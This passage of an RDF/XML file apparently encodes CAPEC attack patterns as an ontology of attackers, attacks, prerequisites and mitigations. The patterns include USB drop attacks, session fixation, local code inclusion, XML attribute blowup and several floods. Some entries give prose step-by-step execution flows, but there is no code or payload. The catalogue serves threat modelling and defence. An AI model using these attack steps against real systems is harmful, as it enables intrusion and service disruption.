      <j.0:Attack rdf:about="http://krstProj.com/capec#attack127">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#457">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:456::NATURE:CanPrecede:CAPEC ID:529::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#USB Memory Attacks"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine Target System) In certain cases  the adversary will explore an organization&apos;s network to determine a specific target machine to exploit based on the information it contains or privileges the main user may possess.TECHNIQUE:If needed  the adversary explores an organization&apos;s network to determine if any specific systems of interest exist.::STEP:2:PHASE:Experiment:DESCRIPTION:(Develop or Obtain malware and install on a USB device) The adversary develops or obtains the malicious software necessary to exploit the target system  which he then installs on an external USB device such as a USB flash drive.TECHNIQUE:The adversary can develop or obtain malware for to perform a variety of tasks such as sniffing network traffic or monitoring keystrokes.::STEP:3:PHASE:Exploit:DESCRIPTION:(Connect or deceive a user into connecting the infected USB device) Once the malware has been placed on an external USB device  the adversary connects the device to the target system or deceives a user into connecting the device to the target system such as in a USB Drop Attack.TECHNIQUE:The adversary connects the USB device to a specified target system or performs a USB Drop Attack  hoping a user will find and connect the USB device on his own. Once the device is connected  the malware executes giving the adversary access to network traffic  credentials  etc.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Leverage stateful firewalls that allow for the rejection of a packet that is not part of an existing connection.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack164"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker23">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#505">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:173::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Scheme Squatting"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack23">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#505"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker26">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#649">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:635::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Adding a Space to a File Extension"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack26">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#649"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::46::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::46::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The use of the file must be controlled by the file extension.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Usage of configuration settings  such as stream ciphers vs. block ciphers and setting timeouts on SSL sessions to extremely low values lessens the potential impact. Use of later versions of TLS (e.g. TLS 1.1+) can also be effective  but not all clients or servers support the later versions.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack178"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use a language or compiler that performs automatic bounds checking.::Use secure functions not vulnerable to buffer overflow.::If you have to use dangerous functions  make sure that you do boundary checking.::Compiler-based canary mechanisms such as StackGuard  ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking  it is not a complete solution.::Use OS-level preventative functionality. Not a complete solution.::Utilize static source code analysis tools to identify potential buffer overflow weaknesses in the software.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack367"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker25">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#270"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack25"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::15::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker28">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#554"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack28"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::424::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::This attack may be mitigated completely by using a parser that is not using a vulnerable container. Mitigation may also limit the number of attributes per XML element.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack448">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#229">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:231::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#XML Attribute Blowup"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::770::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the target) Using a browser or an automated tool  an attacker records all instances of web services to process XML requests.TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Exploit:DESCRIPTION:(Launch an XML Attribute Blowup attack) The attacker crafts malicious XML message that contains multiple Attributes in the same node.TECHNIQUE:Send the malicious crafted XML message containing the multiple attributes to the target URL  causing a denail of service.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use libraries and templates that minimize unfiltered input.::Implementation: Normalize  filter and white list any input that will be included in any subsequent web pages or back end operations.::Implementation: The victim should configure the browser to minimize active content from untrusted sources.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack113">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#247">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#XSS Using Invalid Characters"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::86::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker444">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#252"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack444"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::829::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted PHP application must have a bug that allows an attacker to control which code file is loaded at some juncture.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker needs to have enough access to the target application to control the identity of a locally included PHP file.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker311">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#485">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:473::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Signature Spoofing by Key Recreation"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack311">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#485"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::330::310::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::330::310::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An authoritative signer is using a weak method of random number generation or weak signing software that causes key leakage or permits key inference.::An authoritative signer is using a signature algorithm with a direct weakness or with poorly chosen parameters that enable the key to be recovered using signatures from that signer.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Cryptanalysis of signature generation algorithm:LEVEL:High::SKILL:Reverse engineering and cryptanalysis of signature generation algorithm implementation and random number generation:LEVEL:High::SKILL:Ability to create malformed data blobs and know how to present them directly or indirectly to a victim.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker27">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#442"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack27"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::Access to the software currently deployed at a victim location. This access is often obtained by leveraging another attack pattern to gain permissions that the adversary wouldn&apos;t normally have.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Employ code obfuscation techniques to prevent the adversary from reverse engineering the targeted entity.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack52"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker310">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#607"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack310"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker443">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#268"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack443"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::117::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The target host is logging the action and data of the user.::The target host insufficiently protects access to the logs or logging mechanisms.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must understand how the logging mechanism works. Optionally  the attacker must know the location and the format of individual entries of the log files.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker139">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#482">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:125::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#TCP Flood"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack139">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#482"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::770::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of an attack requires the ability to generate a large amount of TCP traffic to send to the target port of a functioning server.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker442">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#61">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:593::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Session Fixation"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack442">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#61"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::384::361::664::732::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Setup the Attack) Setup a session: The attacker has to setup a trap session that provides a valid session identifier  or select an arbitrary identifier  depending on the mechanism employed by the application. A trap session is a dummy session established with the application by the attacker and is used solely for the purpose of obtaining valid session identifiers. The attacker may also be required to periodically refresh the trap session in order to obtain valid session identifiers.TECHNIQUE:The attacker chooses a predefined identifier that he knows.:TECHNIQUE:The attacker creates a trap session for the victim.::STEP:2:PHASE:Experiment:DESCRIPTION:(Attract a Victim) Fixate the session: The attacker now needs to transfer the session identifier from the trap session to the victim by introducing the session identifier into the victim&apos;s browser. This is known as fixating the session. The session identifier can be introduced into the victim&apos;s browser by leveraging cross site scripting vulnerability  using META tags or setting HTTP response headers in a variety of ways.TECHNIQUE:Attackers can put links on web sites (such as forums  blogs  or comment forms).:TECHNIQUE:Attackers can establish rogue proxy servers for network protocols that give out the session ID and then redirect the connection to the legitimate service.:TECHNIQUE:Attackers can email attack URLs to potential victims through spam and phishing techniques.::STEP:3:PHASE:Exploit:DESCRIPTION:(Abuse the Victim&apos;s Session) Takeover the fixated session: Once the victim has achieved a higher level of privilege  possibly by logging into the application  the attacker can now take over the session using the fixated session identifier.TECHNIQUE:The attacker loads the predefined session ID into his browser and browses to protected data or functionality.:TECHNIQUE:The attacker loads the predefined session ID into his software and utilizes functionality with the rights of the victim.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::384::361::664::732::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Session identifiers that remain unchanged when the privilege levels change.::Permissive session management mechanism that accepts random user-generated session identifiers::Predictable session identifiers::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Only basic skills are required to determine and fixate session identifiers in a user&apos;s browser. Subsequent attacks may require greater skill levels depending on the attackers&apos; motives.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker29">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#540"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack29"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::125::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::For this type of attack to be successful  a few prerequisites must be met. First  the targeted software must be written in a language that enables fine grained buffer control. (e.g.  c  c++) Second  the targeted software must actually perform buffer operations and inadequately perform bounds-checking on those buffer operations. Finally  the adversary must have the capability to influence the input that guides these buffer operations.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as LDAP content.::Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the LDAP or application.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack298"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: The victim&apos;s site could protect all potentially sensitive functionality (e.g. search functions) with cross site request forgery (CSRF) protection and not perform any work on behalf of forged requests Design: The browser&apos;s security model could be fixed to not leak timing information for cross domain requests::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack275">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#462">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:54::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Cross-Domain Search Timing"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::385::352::208::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker138">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#489">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:125::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#SSL Flood"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack138">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#489"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::770::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of an attack requires the ability to generate a large amount of SSL traffic to send a target server.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker441">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#251">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:175::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Local Code Inclusion"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack441">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#251"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::829::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Integrity Execute Unauthorized Commands Through local code inclusion  the adversary compromises the integrity of the application.::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data An attacker may leverage local code inclusion in order to print sensitive data to a page  such as hidden configuration files or or password hashes.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::829::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture.::Some variants of this attack may require that old versions of some code files be present and in predictable locations.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary needs to have enough access to the target application to control the identity of a locally included file. The attacker may also need to be able to upload arbitrary code files to the target machine  although any location for these files may be acceptable.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker448">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#229"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack448"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The server accepts XML input and is using a parser with a runtime longer than O(n) for the insertion of a new attribute in the data container.(examples are .NET framework 1.0 and 1.1)::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker315">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#469"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack315"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::772::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::HTTP protocol is usedWeb server used is vulnerable to denial of service via HTTP flooding::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to issues hundreds of HTTP requests::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker314">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#460">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:15::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#HTTP Parameter Pollution (HPP)"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack314">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#460"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::88::147::235::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::88::147::235::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::HTTP protocol is used with some GET/POST parameters passed::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Any tool that enables intercepting and tampering with HTTP requests::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker447">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#608">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:97::"/>
